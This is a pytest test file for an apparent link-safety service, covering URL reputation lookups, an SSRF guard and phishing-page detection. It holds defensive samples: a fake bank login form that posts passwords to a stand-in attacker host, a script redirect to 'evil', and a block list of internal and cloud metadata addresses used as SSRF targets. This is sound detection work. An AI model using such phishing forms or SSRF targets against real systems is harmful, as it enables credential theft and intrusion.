import httpx
import pytest
import respx

from app.config import settings
from app.intel import net, reputation


@pytest.fixture(autouse=True)
def keys(monkeypatch):
    monkeypatch.setattr(settings, "urlhaus_auth_key", "test")
    monkeypatch.setattr(settings, "safe_browsing_api_key", "test")
    monkeypatch.setattr(settings, "virustotal_api_key", "test")
    reputation._cache.clear()
    for breaker in reputation._breakers.values():
        breaker.fails, breaker.until = 0, 0.0


URLHAUS_URL = "https://urlhaus-api.abuse.ch/v1/url/"
URLHAUS_HOST = "https://urlhaus-api.abuse.ch/v1/host/"


@respx.mock
def test_urlhaus_exact_url_hit():
    respx.post(URLHAUS_URL).mock(return_value=httpx.Response(200, json={"query_status": "ok"}))
    assert reputation.check_urlhaus("http://bad.example/x", "bad.example").status == "hit"


@respx.mock
def test_urlhaus_host_listing_counts_only_for_unknown_sites_with_online_urls():
    respx.post(URLHAUS_URL).mock(return_value=httpx.Response(200, json={"query_status": "no_results"}))
    respx.post(URLHAUS_HOST).mock(return_value=httpx.Response(200, json={"query_status": "ok", "urls": [{"url_status": "online"}]}))
    assert reputation.check_urlhaus("http://x.example/a", "x.example", host_level=True).status == "hit"
    reputation._cache.clear()
    assert reputation.check_urlhaus("http://x.example/a", "x.example", host_level=False).status == "clean"


@respx.mock
def test_urlhaus_offline_only_urls_are_not_a_hit():
    respx.post(URLHAUS_URL).mock(return_value=httpx.Response(200, json={"query_status": "no_results"}))
    respx.post(URLHAUS_HOST).mock(return_value=httpx.Response(200, json={"query_status": "ok", "urls": [{"url_status": "offline"}]}))
    assert reputation.check_urlhaus("http://y.example/a", "y.example").status == "clean"


@respx.mock
def test_safe_browsing_match_and_outage():
    route = respx.post("https://safebrowsing.googleapis.com/v4/threatMatches:find")
    route.mock(return_value=httpx.Response(200, json={"matches": [{"threatType": "SOCIAL_ENGINEERING"}]}))
    r = reputation.check_safe_browsing("http://phish.example/")
    assert r.status == "hit" and "SOCIAL_ENGINEERING" in r.detail
    reputation._cache.clear()
    route.mock(return_value=httpx.Response(500))
    assert reputation.check_safe_browsing("http://other.example/").status == "unavailable"


def test_missing_keys_are_skipped_not_errors(monkeypatch):
    monkeypatch.setattr(settings, "safe_browsing_api_key", None)
    assert reputation.check_safe_browsing("http://a.example/").status == "skipped"


# ---------------- SSRF guard ----------------
@pytest.mark.parametrize("url", ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data", "http://10.0.0.5/", "http://[::1]/"])
def test_private_addresses_are_blocked_without_any_request(url):
    assert net.fetch(url).outcome == "BLOCKED"


def test_unusual_ports_and_schemes_blocked():
    assert net.fetch("http://example.org:22/").outcome == "BLOCKED"
    assert net.fetch("ftp://example.org/").outcome == "BLOCKED"


@respx.mock
def test_redirect_to_private_address_is_blocked(monkeypatch):
    monkeypatch.setattr(net, "resolve_public", lambda host: (_ for _ in ()).throw(net.BlockedHost("private")) if host == "internal.test" else ["93.184.216.3"])
    respx.get("http://93.184.216.3/").mock(return_value=httpx.Response(302, headers={"location": "http://internal.test/"}))
    result = net.fetch("http://public.test/")
    assert result.outcome == "BLOCKED" and result.chain == ["http://public.test/", "http://internal.test/"]


@respx.mock
def test_redirect_chain_and_dead_link(monkeypatch):
    monkeypatch.setattr(net, "resolve_public", lambda host: {"a.test": ["93.184.216.1"], "b.test": ["93.184.216.2"], "public.test": ["93.184.216.3"]}.get(host, ["93.184.216.4"]))
    respx.get("http://93.184.216.1/").mock(return_value=httpx.Response(301, headers={"location": "http://b.test/"}))
    respx.get("http://93.184.216.2/").mock(return_value=httpx.Response(404))
    result = net.fetch("http://a.test/")
    assert result.outcome == "NOT_FOUND" and len(result.chain) == 2


@respx.mock
def test_redirect_loop(monkeypatch):
    monkeypatch.setattr(net, "resolve_public", lambda host: {"a.test": ["93.184.216.1"], "b.test": ["93.184.216.2"], "public.test": ["93.184.216.3"]}.get(host, ["93.184.216.4"]))
    respx.get("http://93.184.216.1/").mock(return_value=httpx.Response(302, headers={"location": "http://b.test/"}))
    respx.get("http://93.184.216.2/").mock(return_value=httpx.Response(302, headers={"location": "http://a.test/"}))
    assert net.fetch("http://a.test/").outcome == "LOOP"


def test_nxdomain(monkeypatch):
    import socket

    def boom(host):
        raise socket.gaierror("nope")

    monkeypatch.setattr(net, "resolve_public", boom)
    assert net.fetch("http://does-not-exist.test/").outcome == "NXDOMAIN"


# ---------------- page inspection ----------------
def test_fake_bank_login_page_is_detected():
    from app.intel import page
    from app.intel.urls import parse_url

    html = "<html><title>HDFC Bank NetBanking Login</title><form action='https://collector.evil.top/p'><input type='password' name='pwd'></form></html>"
    ids = {s.id for s in page.analyze(parse_url("https://hdfc-login-secure.top/"), html)}
    assert {"FORM_CROSS_DOMAIN", "BRAND_MISMATCH_PAGE"} <= ids


def test_harmless_page_has_no_signals_and_scripts_are_not_run():
    from app.intel import page
    from app.intel.urls import parse_url

    html = "<html><title>Rahul's pottery</title><script>document.location='http://evil'</script><p>Handmade pots</p></html>"
    assert page.analyze(parse_url("https://rahulpottery.in/"), html) == []


@respx.mock
def test_request_goes_to_the_validated_address_with_the_real_name_in_the_host_header(monkeypatch):
    """DNS rebinding: the second DNS answer must never be used, so the connection targets the IP we checked."""
    monkeypatch.setattr(net, "resolve_public", lambda host: ["93.184.216.9"])
    route = respx.get("http://93.184.216.9/page").mock(return_value=httpx.Response(200, text="ok", headers={"content-type": "text/plain"}))
    assert net.fetch("http://site.test/page").outcome == "OK"
    assert route.calls.last.request.headers["host"] == "site.test"
